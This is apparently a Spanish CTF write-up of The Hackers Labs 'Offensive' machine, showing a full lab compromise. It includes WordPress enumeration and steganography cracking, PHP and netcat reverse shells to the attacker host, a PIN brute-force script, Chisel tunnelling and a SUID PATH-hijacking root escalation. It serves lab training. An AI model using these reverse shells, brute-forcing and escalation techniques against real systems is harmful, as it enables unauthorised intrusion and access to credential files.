---
title: Offensive
description: La seguridad ofensiva es la adrenalina pura del mundo cibernético. Enfréntate a sistemas desafiantes, explora vulnerabilidades y despliega tácticas de hacking para descubrir brechas antes que los malos. ¡Cada reto en una plataforma de CTF es una oportunidad para afilar tus habilidades y dominar el arte del ataque!
date: 2025-03-07
toc: true
pin: false
image:
 path: /assets/img/thl-writeup-offensive/offensive_logo.png
categories:
  - The_Hackers_Labs
tags:
  - linux
  - the_hackers_labs
  - tcp
  - ssh
  - http
  - wordpress
  - fuzzing_web
  - steganography
  - misconfigurations
  - os_command_injection
  - rce
  - interactive_tty
  - port_forwarding
  - password_attacks
  - suid
  - path_hijacking
  - information_gathering
  - web_analysis
  - misconfiguration_exploitation
  - foothold
  - lateral_movement
  - privilege_escalation

---
## Information Gathering

```terminal
/home/kali/Documents/thl/offensive:-$ sudo arp-scan -l | grep 08:00
192.168.0.38	08:00:27:23:fc:06	PCS Systemtechnik GmbH
```

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/thl/offensive:-$ ping -c 1 192.168.0.38
PING 192.168.0.38 (192.168.0.38) 56(84) bytes of data.
64 bytes from 192.168.0.38: icmp_seq=1 ttl=64 time=0.186 ms

--- 192.168.0.38 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.186/0.186/0.186/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/thl/offensive:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG nmap1 192.168.0.38
Host: 192.168.0.38 ()	Status: Up
Host: 192.168.0.38 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 8080/open/tcp//http-proxy///
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/thl/offensive:-$ sudo nmap -sCV -p22,80,8080 -vvv -oN nmap2 192.168.0.38
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 078387c56dc4864c3a34b763105707c6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCf0rXSN8ba378gdeeC7O3c4mRpu0X6lmzZcFn2K2GIJXzuxN9yr+7yGDK+y3cVBrSwrc6MjDxaLpphKuwkYOe0=
|   256 35c83d6401ec8ac3a012925af4df6eb6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIER7wLUITsnxSpPwvydMHdpY0Beto95jmuRZiUzJKJZe
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-generator: WordPress 6.7.1
|_http-title: rodgar
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
8080/tcp open  http    syn-ack ttl 64 Node.js Express framework
|_http-title: Error
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
MAC Address: 08:00:27:23:FC:06 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```terminal
/home/kali/Documents/thl/offensive:-$ whatweb 192.168.0.38
http://192.168.0.38 [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[192.168.0.38], MetaGenerator[WordPress 6.7.1], Script, Title[rodgar], UncommonHeaders[link], WordPress[6.7.1]
```

---
## Web Analysis

El servicio web es bastante simple y no contiene mucha información relevante, más allá del título que proporciona el nombre del dominio.

![](assets/img/thl-writeup-offensive/offensive1_1.png)

```terminal
/home/kali/Documents/thl/offensive:-$ echo '192.168.0.38\toffensive.thl' | tee -a /etc/hosts
```

A partir del escaneo con WhatWeb, detecto que el servicio está utilizando WordPress. Para obtener más información utilice wpscan, como resultado, se identifica un usuario llamado `Administrator`.

```terminal
/home/kali/Documents/thl/offensive:-$ wpscan --url http://offensive.thl --enumerate u
```

![](assets/img/thl-writeup-offensive/offensive1_2.png)

```terminal
/home/kali/Documents/thl/offensive:-$ dirb http://offensive.thl/
---- Scanning URL: http://offensive.thl/ ----
==> DIRECTORY: http://offensive.thl/images/
+ http://offensive.thl/index.php (CODE:301|SIZE:0)
==> DIRECTORY: http://offensive.thl/javascript/
+ http://offensive.thl/server-status (CODE:403|SIZE:277)
==> DIRECTORY: http://offensive.thl/wp-admin/
==> DIRECTORY: http://offensive.thl/wp-content/
==> DIRECTORY: http://offensive.thl/wp-includes/
---- Entering directory: http://offensive.thl/images/ ----
---- Entering directory: http://offensive.thl/javascript/ ----
==> DIRECTORY: http://offensive.thl/javascript/events/
==> DIRECTORY: http://offensive.thl/javascript/jquery/
==> DIRECTORY: http://offensive.thl/javascript/util/
---- Entering directory: http://offensive.thl/wp-admin/ ----
+ http://offensive.thl/wp-admin/admin.php (CODE:302|SIZE:0)
==> DIRECTORY: http://offensive.thl/wp-admin/css/
==> DIRECTORY: http://offensive.thl/wp-admin/images/
==> DIRECTORY: http://offensive.thl/wp-admin/includes/
+ http://offensive.thl/wp-admin/index.php (CODE:302|SIZE:0)
==> DIRECTORY: http://offensive.thl/wp-admin/js/
==> DIRECTORY: http://offensive.thl/wp-admin/maint/
==> DIRECTORY: http://offensive.thl/wp-admin/network/
==> DIRECTORY: http://offensive.thl/wp-admin/user/
---- Entering directory: http://offensive.thl/wp-content/ ----
+ http://offensive.thl/wp-content/index.php (CODE:200|SIZE:0)
==> DIRECTORY: http://offensive.thl/wp-content/languages/
==> DIRECTORY: http://offensive.thl/wp-content/plugins/
==> DIRECTORY: http://offensive.thl/wp-content/themes/
---- Entering directory: http://offensive.thl/wp-includes/ ----
---- Entering directory: http://offensive.thl/javascript/events/ ----
+ http://offensive.thl/javascript/events/events (CODE:200|SIZE:14890)
---- Entering directory: http://offensive.thl/javascript/jquery/ ----
+ http://offensive.thl/javascript/jquery/jquery (CODE:200|SIZE:289782)
---- Entering directory: http://offensive.thl/javascript/util/ ----
==> DIRECTORY: http://offensive.thl/javascript/util/support/
+ http://offensive.thl/javascript/util/util (CODE:200|SIZE:19697)
---- Entering directory: http://offensive.thl/wp-admin/css/ ----
---- Entering directory: http://offensive.thl/wp-admin/images/ ----
---- Entering directory: http://offensive.thl/wp-admin/includes/ ----
---- Entering directory: http://offensive.thl/wp-admin/js/ ----
---- Entering directory: http://offensive.thl/wp-admin/maint/ ----
---- Entering directory: http://offensive.thl/wp-admin/network/ ----
+ http://offensive.thl/wp-admin/network/admin.php (CODE:302|SIZE:0)
+ http://offensive.thl/wp-admin/network/index.php (CODE:302|SIZE:0)
---- Entering directory: http://offensive.thl/wp-admin/user/ ----
+ http://offensive.thl/wp-admin/user/admin.php (CODE:302|SIZE:0)
+ http://offensive.thl/wp-admin/user/index.php (CODE:302|SIZE:0)
---- Entering directory: http://offensive.thl/wp-content/languages/ ----
---- Entering directory: http://offensive.thl/wp-content/plugins/ ----
+ http://offensive.thl/wp-content/plugins/index.php (CODE:200|SIZE:0)
---- Entering directory: http://offensive.thl/wp-content/themes/ ----
+ http://offensive.thl/wp-content/themes/index.php (CODE:200|SIZE:0)
---- Entering directory: http://offensive.thl/javascript/util/support/ ----
```

El fuzzing revela múltiples rutas interesantes, pero lo más llamativo es la presencia de una imagen `wp-login.jpg` dentro del directorio `images`.

![](assets/img/thl-writeup-offensive/offensive1_3.png)

---

```terminal
/home/kali/Documents/thl/offensive:-$ wget http://offensive.thl/images/wp-login.jpg
```

La imagen podría contener información oculta mediante esteganografía, se intenta extraer datos con steghide.

```terminal
/home/kali/Documents/thl/offensive:-$ steghide extract -sf wp-login.jpg
Enter passphrase:
steghide: could not extract any data with that passphrase!
```

Pero al no conocer la contraseña, utilizo stegseek junto con el diccionario rockyou.txt para intentar recuperar la clave.

```terminal
/home/kali/Documents/thl/offensive:-$ stegseek --crack wp-login.jpg /usr/share/wordlists/rockyou.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "b********d"
[i] Original filename: "wp-login.txt".
[i] Extracting to "wp-login.jpg.out".
```

Con la contraseña recuperada, vuelvó a ejecutar steghide para extraer el archivo oculto.

```terminal
/home/kali/Documents/thl/offensive:-$ steghide extract -sf wp-login.jpg
Enter passphrase: b********d
wrote extracted data to "wp-login.txt".
```

Al inspeccionar el archivo extraído encuentro una posible contraseña.

```terminal
/home/kali/Documents/thl/offensive:-$ cat wp-login.txt
uF********************a5
```

Cuento con la posible credencial `administrator`:`uF********************a5`. Pero no se ha identificado un formulario de inicio de sesión para probarla.

---
## Misconfiguration Exploitation

A continuación, prosigo con el análisis del puerto 8080. A primera vista, no encuentro nada relevante en el servicio web.

![](assets/img/thl-writeup-offensive/offensive1_4.png)

Sin embargo, al fuzzear el sitio, descubro que se aceptan varios endpoints que permiten ver y manipular el contenido del directorio `/var/www`.

```terminal
/home/kali/Documents/thl/offensive:-$ wfuzz -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://offensive.thl:8080/FUZZ/" -c -t 200 --hc=404
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000061:   200        0 L      17 W       203 Ch      "help"
000000589:   500        0 L      3 W        31 Ch       "cat"
000003099:   200        0 L      1 W        176 Ch      "ls"
000004628:   500        0 L      5 W        45 Ch       "rm"
```

![](assets/img/thl-writeup-offensive/offensive1_5.png)

Estos endpoints permiten listar y manipular archivos en `/var/www`. Por ejemplo, puedo listar los plugins instalados en WordPress.

```terminal
/home/kali/Documents/thl/offensive:-$ curl -s http://offensive.thl:8080/ls\?path\=wordpress/wp-content/plugins | jq
```

![](assets/img/thl-writeup-offensive/offensive1_6.png)

Entre los plugins, identifico que `wps-hide-login` es el que impide el acceso al formulario de inicio de sesión, para solucionarlo, lo elimino.

```terminal
/home/kali/Documents/thl/offensive:-$ curl -s http://offensive.thl:8080/rm\?path\=wordpress/wp-content/plugins/wps-hide-login | jq
{
  "message": "File or directory deleted successfully."
}
```

Con esta acción, ya puedo acceder al formulario e iniciar sesión como el usuario `administrator`.

![](assets/img/thl-writeup-offensive/offensive1_7.png)
![](assets/img/thl-writeup-offensive/offensive1_8.png)

---
## Foothold

Una vez dentro del panel de administración, identifico en la pestaña de plugins que `wpterm` está instalado y activo.

![](assets/img/thl-writeup-offensive/offensive2_1.png)
![](assets/img/thl-writeup-offensive/offensive2_2.png)

Con esta herramienta, soy capaz de ejecutar comandos de forma remota y establecer una conexión inversa hacia mi máquina de atacante.

```terminal
/home/kali/Documents/thl/offensive:-$ nc -lnvp 4321
	listening on [any] 4321 ...
```
```terminal
www-data:/var/www/wordpress $ php -r '$sock=fsockopen("192.168.0.99",4321);system("/bin/bash <&3 >&3 2>&3");'
```
```terminal
	... connect to [192.168.0.99] from (UNKNOWN) [192.168.0.38] 52892.

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---
## Lateral Movement

```terminal
script /dev/null -c bash
www-data@TheHackersLabs-Offensive:/var/www/wordpress$ ^Z
/home/kali/Documents/thl/offensive:-$ stty raw -echo;fg
						reset xterm
www-data@TheHackersLabs-Offensive:/var/www/wordpress$ export TERM=xterm
www-data@TheHackersLabs-Offensive:/var/www/wordpress$ export SHELL=bash
www-data@TheHackersLabs-Offensive:/var/www/wordpress$ stty rows 34 columns 158
```

```terminal
www-data@TheHackersLabs-Offensive:/var/www/wordpress $ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
maria:x:1001:1001::/home/maria:/bin/bash
```

Como usuario `www-data`, identifico un servicio interno corriendo en el puerto 5000.

```terminal
www-data@TheHackersLabs-Offensive:/var/www/wordpress$ ss -tulnp
```

![](assets/img/thl-writeup-offensive/offensive3_1.png)

Para interactuar con este servicio, descargo la Chisel y redirijo el puerto 5000 a mi maquina.

```terminal
www-data@TheHackersLabs-Offensive:/tmp$ wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz
www-data@TheHackersLabs-Offensive:/tmp$ chmod +x chisel_1.10.1_linux_amd64

/home/kali/Documents/thl/offensive:-$ chisel server --reverse -p 4444
2025/03/06 22:28:46 server: Listening on http://0.0.0.0:4444

www-data@TheHackersLabs-Offensive:/tmp$ ./chisel_1.10.1_linux_amd64 client 192.168.0.99:4444 R:5000:127.0.0.1:5000
2025/03/06 19:29:53 client: Connected (Latency 297.43µs)
```

Posteriormente, encuentro un panel de login que ya tiene las credenciales precargadas, pero requiere un PIN de 4 dígitos para continuar.

![](assets/img/thl-writeup-offensive/offensive3_2.png)

En lugar de utilizar el Intruder de Burp Suite, ejecuto un script en Python para forzar la búsqueda del PIN.

```python
import requests

def fuzz_pin():
    url = "http://127.0.0.1:5000"
    base_data = "usuario=admin&password=disconnected&pin={}"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    invalid_data = base_data.format("0000")
    invalid_response = requests.post(url, headers=headers, data=invalid_data, allow_redirects=False)
    invalid_length = len(invalid_response.content)
    print(f"[*] Longitud esperada para PIN incorrecto: {invalid_length}")
    
    possible_pins = []
    
    for pin in range(0, 10000):
        pin_str = str(pin).zfill(4)
        data = base_data.format(pin_str)
        response = requests.post(url, headers=headers, data=data, allow_redirects=False)
        
        if len(response.content) != invalid_length:
            print(f"[+] Posible PIN encontrado: {pin_str}")
            possible_pins.append(pin_str)
        else:
            print(f"[-] Probando PIN: {pin_str}", end="\r")
    
    if possible_pins:
        print("\n[+] Lista de posibles PINs:")
        for pin in possible_pins:
            print(f"    - {pin}")
    else:
        print("\n[-] No se encontraron PINs válidos.")

if __name__ == "__main__":
    fuzz_pin()
```
```terminal
/home/kali/Documents/thl/offensive:-$ python3 fuzz_pin.py
[+] Posible PIN encontrado: ****
```

El PIN obtenido es válido, lo que me permite pasar el panel.

---

Continuo analizando el entorno y descubro que el servicio parece contar con una herramienta que permite ejecutar comandos con privilegios del usuario `maria`.

![](assets/img/thl-writeup-offensive/offensive4_1.png)

```terminal
/home/kali/Documents/thl/offensive:-$ nc -lnvp 4322
	listening on [any] 4322 ...
```

Puedo establecer una conexión hacia mi máquina usando netcat mediante el comando:
* `nc -e /bin/bash 192.168.0.171 4322`.

![](assets/img/thl-writeup-offensive/offensive4_2.png)

```terminal
	... connect to [192.168.0.171] from (UNKNOWN) [192.168.0.38] 56364
id
uid=1001(maria) gid=1001(maria) grupos=1001(maria)

script /dev/null -c bash

maria@TheHackersLabs-Offensive:~$ cat /home/maria/user.txt
```

---
## Privilege Escalation

Verifico que en el directorio del usuario `maria` existe una aplicación denominada `app` que se ejecuta con permisos SUID, lo que me permite ejecutar comandos como `root`. Al ejecutar el binario, este muestra únicamente las primeras líneas del archivo `/etc/shadow` en lugar de mostrarlo completo.

```terminal
maria@TheHackersLabs-Offensive:~$ ls -al app
-rwsr-xr-x 1 root root 16056 dic 26 10:22 app

maria@TheHackersLabs-Offensive:~$ ./app
```

![](assets/img/thl-writeup-offensive/offensive5_1.png)

Para entender cómo opera, ejecuto strings en el binario y filtro las cadenas relacionadas con "shadow".

```terminal
maria@TheHackersLabs-Offensive:~$ strings app | grep shadow
/usr/bin/head -n 8 /etc/shadow
head -n 8 /etc/shadow
```

El programa utiliza el comando `head` para mostrar las primeras 8 líneas de `/etc/shadow`. Noto que se realizan llamadas tanto con rutas absolutas como con rutas relativas.

Para interceptar la llamada relativa, modifico la variable de entorno PATH para que comience en mi directorio `/home/maria`, de modo que si el programa invoca el comando de manera relativa, se ejecute mi versión maliciosa.

* Modifico el PATH para que incluya mi directorio de inicio.
* Creo un script malicioso llamado `head` en `/home/maria` que ejecute Bash con privilegios.

```terminal
maria@TheHackersLabs-Offensive:~$ export PATH=/home/maria:$PATH
maria@TheHackersLabs-Offensive:~$ echo '/bin/bash -p' > head
maria@TheHackersLabs-Offensive:~$ chmod +x head
```

Al ejecutarlo el binario, el programa utiliza mi script `head` y lanza `bash -p`, lo que me proporciona una shell con privilegios de `root`.

```terminal
maria@TheHackersLabs-Offensive:~$ ./app
```

![](assets/img/thl-writeup-offensive/offensive5_2.png)

```
root@TheHackersLabs-Offensive:~# cat /root/root.txt
```